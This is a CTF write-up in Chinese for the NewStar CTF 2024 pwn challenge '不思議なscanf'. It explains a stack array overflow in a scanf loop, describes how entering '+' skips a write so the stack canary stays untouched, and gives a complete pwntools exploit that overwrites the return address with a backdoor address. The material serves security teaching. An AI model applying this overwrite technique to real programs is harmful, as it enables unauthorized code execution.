---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
# 不思議なscanf

```c
int __fastcall main(int argc, const char **argv, const char**envp)
{
  int v3; // eax
  int i; // [rsp+Ch] [rbp-24h]
  _DWORD v6[6]; // [rsp+10h] [rbp-20h] BYREF
  unsigned__int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  initial(argc, argv, envp);
  puts(aGgggggggggeeee);
  for ( i = 0; i <= 15; ++i )
  {
    printf(format);
    v3 = i;
    __isoc99_scanf(&unk_4047FA, &v6[v3]);
  }
  puts("銉愩偆銉愩偆");
  return 0;
}
```

程序定义了一个int类型的数组，并利用for循环用scanf向数组读入内容

但是for循环的次数是16次，已经超出了数组定义的范围，造成了数组越界

所以我们最终的目的就是利用这个数组越界修改main函数的返回地址

![查看保护](/assets/images/wp/2024/week3/scanf_1.png)

![查看汇编](/assets/images/wp/2024/week3/scanf_2.png)

:::tip
scanf时使用的参数%d

正常输入时，输入为范围在-2147483648~2147483647内的整数。

如果输入范围在-9223372036854775808~9223372036854775807内的整数，则会截断高位读取，此范围是long long int的范围。

如果输入范围在long long int范围之外，则统一将参数赋值为-1（0xFFFFFFFF）

如果输入为非数字，分为下列情况：

1. 如果输入仅有一个，则该输入无效，该值不变。

2. 如果输入有数字前缀（如12345abcd），则scanf仅会读取前面的数字，从第一个非数字开始，后面全部舍弃（12345）。

3. 如果输入有多个且使用一个scanf语句（如scanf(“%d, %d”, &a, &b)）。输入第一个非数字后，后面的所有输入均为无效，前面的输入可以赋值。

4. 如果输入有多个且使用多个scanf语句（含循环，即一个scanf中仅有一个输入），则输入非数字时，如果输入的不是`+`或`-`，则后面紧跟的所有scanf均自动跳过，变为无效，不能输入。如果输入的`+`或`-`，则会跳过当前输入，后面仍然可以进行输入。

摘抄自：<https://blog.csdn.net/qq_54218833/article/details/121308367>
:::

这里我们需要利用scanf多次输入的特性，通过输入字符`+`来跳过对canary的修改，进而直接修改返回地址为后门地址

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

p = process('./pwn')
elf = ELF('./pwn')

for _ in range(10):
    ru('わたし、気になります！')
    sl(b'+')

ru('わたし、気になります！')
sl(str(0x401240))
ru('わたし、気になります！')
sl(str(0))

for _ in range(4):
    ru('わたし、気になります！')
    sl(b'+')

p.interactive()
```
